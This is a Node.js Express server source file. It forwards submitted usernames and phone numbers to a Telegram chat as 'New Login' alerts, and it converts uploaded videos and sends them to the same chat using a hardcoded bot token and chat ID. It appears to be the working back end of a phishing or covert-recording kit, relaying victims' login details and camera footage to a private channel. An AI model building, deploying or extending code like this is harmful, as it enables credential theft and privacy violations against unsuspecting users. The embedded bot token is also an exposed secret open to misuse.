const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const path = require("path");

const app = express();

// =====================
// ⚙️ MIDDLEWARE & SETUP
// =====================
app.use(cors());
app.use(express.json()); 

// Ensure uploads folder exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
    console.log("✅ Created 'uploads' directory");
}

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`); 
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 PHONE LOGIN ROUTE
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    
    if (!username || !phone) {
        return res.status(400).send("Missing data");
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🔔 *New Login*\n👤 User: ${username}\n📱 Phone: ${phone}`,
            parse_mode: "Markdown"
        });
        res.status(200).send("Login sent to bot");
    } catch (err) {
        console.error("❌ Login Error:", err.message);
        res.status(500).send("Bot failed to send login");
    }
});

// =====================
// 🚀 VIDEO UPLOAD ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath = null;
    let mp4Path = null;

    try {
        console.log("\n--- New Upload Request ---");

        if (!req.file) {
            return res.status(400).send("No file uploaded");
        }

        filePath = path.resolve(req.file.path);
        mp4Path = filePath + ".mp4";

        console.log("🔄 Converting video...");

        // 1. Convert to MP4 (Optimized for Telegram)
        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac",
                    "-movflags +faststart" // Allows video to play before fully downloaded
                ])
                .save(mp4Path)
                .on("end", () => {
                    console.log("✅ Conversion complete");
                    resolve();
                })
                .on("error", (err) => {
                    console.error("❌ FFmpeg error:", err.message);
                    reject(err);
                });
        });

        // 2. Prepare for Telegram
        console.log("📤 Sending to Telegram...");
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", fs.createReadStream(mp4Path), {
            filename: "video.mp4",
            contentType: "video/mp4"
        });

        // 3. Send to API
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
            form,
            { 
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity 
            }
        );

        console.log("📨 Telegram upload successful!");
        res.status(200).send("Upload successful");

    } catch (err) {
        console.error("❌ Process Error:", err.message);
        if (err.response?.data) console.error("API Error Details:", err.response.data);
        res.status(500).send("Failed to process video");
    } finally {
        // 4. Cleanup after delay to avoid file-locking issues
        setTimeout(() => {
            try {
                if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
                if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
                console.log("🧹 Cleanup: Temp files removed");
            } catch (cleanupErr) {
                console.error("🧹 Cleanup Warning:", cleanupErr.message);
            }
        }, 3000); // 3-second buffer
    }
});

// =====================
// 🌐 START SERVER
// =====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Server active on port ${PORT}`);
});
